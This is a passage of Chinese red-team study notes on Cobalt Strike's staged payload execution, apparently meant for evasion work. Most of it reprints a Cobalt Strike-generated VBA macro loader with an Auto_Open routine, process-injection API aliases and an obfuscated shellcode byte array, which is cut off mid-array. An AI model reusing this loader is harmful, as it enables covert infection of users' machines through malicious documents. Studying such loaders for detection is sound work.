我的CS笔记之- In-memory Evasion 2
0x01 前言
内存逃逸的第二部分主要是作者讲诉CS的Payload的一个完整执行流程，这个对理解CS植入体非常重
要，对后面做免杀、规避都起到很大作用。第一部分讲侦测手法、第二部分讲自身运行流程，真的是知
己知彼。这一部分作者先讲诉了Stager是什么？然后讲述一个分段加载Payload的完整执行流程，接着
就是不分段加载，最后作者讲了进程注入相关技术在CS中的应用。
0x02 分阶段payload和不分阶段payload
关于分不分阶段，使用过CS的小伙伴应该都很清楚了，但是里面的具体细节，相信很多小伙伴也是一知
半解。下面就详细说下分阶段Payload。
分阶段的payload在进程中执行的流程：
1. 申请一个块儿内存（allocate memory）
2. 复制Stager去这一块儿内存里
3. 创建一个线程，运行这个Stager
4. 这个Stager会再次申请一块儿内存（allocate memory）
5. Stager去下载加密的payload，写入申请的内存中
6. Stager把执行流程转递给这个加密的payload
7. 加密的payload自解密成Reflective DLL
8. 然后把执行流程传递给Reflective DLL
9. Reflective DLL 申请一个块儿内存（allocate memory）
10. 然后初始化自己在新的内存里面
11. 最后reflective DLL 调用payload的入口点函数
这就是一个分阶段的payload的完整加载流程，如果你细细思考，里面存在一个问题，就是第7步被加密
的payload怎么自解密？实际情况是这个所谓的被加密的payload分为2部分，一部分是解密程序，这个
是不加密的，然后才是被加密的反射dll，也就是Beacon.dll。
从1-3是我们loader的执行，3-6是Stager在内存中的执行，7-8是加密payload的执行，9-11是反射DLL
的执行。
我们通过CS生成一个macro样本loader，直观的感受下：
loader
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type
Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 1 / 7 - Welcome to www.red-team.cn
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type
#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias 
"CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, 
ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, 
ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias 
"VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As 
Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias 
"WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef 
Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias 
"CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As 
String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal 
bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, 
ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, 
lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias 
"CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, 
ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, 
ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" 
(ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal 
flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" 
(ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length 
As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" 
(ByVal lpApplicationName As String, ByVal lpCommandLine As String, 
lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As 
Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal 
lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation 
As PROCESS_INFORMATION) As Long
#End If
Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String
#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 2 / 7 - Welcome to www.red-team.cn
    Dim rwxpage As Long, res As Long
#End If
    myArray = 
Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,
-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1
,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,
88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,1
04,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,-24,0,0,0,0,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-92,0,0,0,91,4
9,-55,81,81,106,3,81,81,104,-69,1,0,0,83, _
80,104,87,-119,-97,-58,-1,-43,80,-23,-116,0,0,0,91,49,-46,82,104,0,50,-64,-124,8
2,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61, _
80,104,-128,51,0,0,-119,-32,106,4,80,106,31,86,104,117,70,-98,-122,-1,-43,95,49,
-1,87,87,106,-1,83,86,104,45,6,24,123,-1,-43,-123,-64,15, _
-124,-54,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119
,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104, _
-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,117,7,88,80,-23,123,-1,-1,-1,49,-1,-23,
-111,1,0,0,-23,-55,1,0,0,-24,111,-1,-1,-1,47, _
51,76,114,107,0,-109,-91,-125,30,-110,69,-22,-15,61,-39,25,45,22,28,-86,75,-98,-
50,89,-113,112,46,-124,28,53,96,27,-98,111,65,105,-36,-127,85,-18, _
34,1,86,46,84,-52,-79,-4,71,-47,74,-83,59,-113,59,-124,119,-8,49,-116,44,-127,11
2,17,19,19,75,28,-112,75,91,-26,80,15,-122,25,96,-98,0,85, _
115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32
,40,99,111,109,112,97,116,105,98,108,101,59,32,77,83,73,69, _
32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,46,78,69
,84,32,67,76,82,32,49,46,49,46,52,51,50,50,41, _
13,10,0,84,-98,-33,90,-46,51,-110,12,-47,40,-16,-113,18,-41,62,98,67,65,-96,-54,